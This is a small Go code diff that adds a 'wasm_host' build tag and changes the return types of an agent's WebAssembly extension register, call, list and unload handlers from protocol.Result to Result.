@@ -1,3 +1,5 @@
+//go:build wasm_host
+
 package core
 
 import (
@@ -114,7 +116,7 @@ func extHostArgs(_ context.Context, m api.Module,
 	return uint32(len(joined))
 }
 
-func (a *Agent) extensionRegister(t protocol.Task) protocol.Result {
+func (a *Agent) extensionRegister(t protocol.Task) Result {
 	if len(t.Args) < 2 {
 		return Result{ID: t.ID,
 			Error: "extension_register requires <name> <b64_wasm>"}
@@ -171,7 +173,7 @@ func (a *Agent) extensionRegister(t protocol.Task) protocol.Result {
 		Output: encodeOutput([]byte("loaded " + name + "\n"))}
 }
 
-func (a *Agent) extensionCall(ctx context.Context, t protocol.Task) protocol.Result {
+func (a *Agent) extensionCall(ctx context.Context, t protocol.Task) Result {
 	if len(t.Args) < 1 {
 		return Result{ID: t.ID, Error: "extension_call requires <name>"}
 	}
@@ -220,7 +222,7 @@ func (a *Agent) extensionCall(ctx context.Context, t protocol.Task) protocol.Res
 	return r
 }
 
-func (a *Agent) extensionList(t protocol.Task) protocol.Result {
+func (a *Agent) extensionList(t protocol.Task) Result {
 	extMu.Lock()
 	defer extMu.Unlock()
 	names := make([]string, 0, len(extModules))
@@ -231,7 +233,7 @@ func (a *Agent) extensionList(t protocol.Task) protocol.Result {
 	return Result{ID: t.ID, Output: encodeOutput(out)}
 }
 
-func (a *Agent) extensionUnload(t protocol.Task) protocol.Result {
+func (a *Agent) extensionUnload(t protocol.Task) Result {
 	if len(t.Args) < 1 {
 		return Result{ID: t.ID, Error: "extension_unload requires <name>"}
 	}
